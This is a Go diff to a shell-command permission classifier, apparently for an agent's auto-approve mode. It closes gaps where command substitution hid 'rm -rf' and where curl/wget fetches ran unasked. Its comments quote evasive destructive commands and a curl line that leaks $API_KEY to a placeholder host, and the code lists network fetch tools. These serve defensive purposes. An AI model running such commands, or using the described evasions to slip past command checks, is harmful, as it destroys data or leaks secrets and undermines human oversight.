@@ -79,9 +79,24 @@ func denyReading(command string) (cmds []safety.SimpleCommand, opaque bool) {
 				opaque = true
 			}
 		}
+		// "$(which rm) -rf x", "`which rm` -rf x", "& (gcm rm) -rf x": the
+		// substitution is the program, but the tokenizer ends a command at
+		// "$(", "`" and "(", so what is left reads as a command whose first
+		// word is an option. That program cannot be read from the text:
+		// every deny and ask rule applies, as for "$RM -rf x".
+		if (hasSubstitution(v) || strings.Contains(v, "(")) && substitutedProgram.MatchString(v) {
+			opaque = true
+		}
 	}
 	return cmds, opaque
 }
+
+// substitutedProgram is a closed substitution or group directly followed by
+// a plain word: "$(which rm) -rf x", "`which rm` -rf x", "& (gcm rm) -rf x",
+// "$(which git) push". A substitution that is an argument ("python3
+// parse.py <(curl URL)", "git commit -m \"$(cat msg)\"", "diff <(a) <(b)")
+// is followed by nothing, an operator or another substitution.
+var substitutedProgram = regexp.MustCompile("[)`]" + `\s+[A-Za-z_./-]`)
 
 // variableProgram reports a simple command whose program word, after the
 // runners in front (sudo, env, VAR=value), is built from a variable or a
@@ -290,11 +305,11 @@ func (c *Classifier) classifyLine(command string, kind ShellKind) (CmdCategory, 
 			if maybePowerShell(kind) && powerShellFetch(sc.Words[0]) {
 				// Under PowerShell curl/wget are Invoke-WebRequest and only its
 				// allowlist applies; under the unknown kind both must pass.
-				switch {
-				case !powerShellFetchReadOnly(sc.Words[1:]):
+				// pwsh 6+ dropped the curl/wget aliases, so under it "wget URL"
+				// is GNU wget writing a file; the 5.1-alias reading no longer
+				// upgrades an unknown curl/wget line to safe.
+				if !powerShellFetchReadOnly(sc.Words[1:]) {
 					cat = CatUnknown
-				case kind == ShellPowerShell && cat == CatUnknown && isCurlOrWget(sc.Words[0]):
-					cat = CatSafe
 				}
 			}
 		}
@@ -370,8 +385,29 @@ func (c *Classifier) AutoApproveLineFor(command string, kind ShellKind) bool {
 	if kind == ShellCmd {
 		return false
 	}
-	cat := c.ClassifyLineFor(command, kind)
-	return cat == CatSafe || cat == CatBuild
+	cat, simple := c.classifyLine(command, kind)
+	if cat != CatSafe && cat != CatBuild {
+		return false
+	}
+	// Network fetches are egress and keep asking in auto mode too, as the
+	// manual says. A GET used to run unasked, and a URL or header carries
+	// whatever the shell expands into it: curl "https://x/?k=$API_KEY".
+	for _, sc := range simple {
+		if len(sc.Words) > 0 && networkFetchProgram(programName(sc.Words[0])) {
+			return false
+		}
+	}
+	return true
+}
+
+// networkFetchProgram is a program that sends a request out: curl, wget and
+// PowerShell's Invoke-WebRequest / Invoke-RestMethod with their aliases.
+func networkFetchProgram(name string) bool {
+	switch strings.ToLower(name) {
+	case "curl", "wget", "iwr", "irm", "invoke-webrequest", "invoke-restmethod":
+		return true
+	}
+	return false
 }
 
 func hasSubstitution(command string) bool {
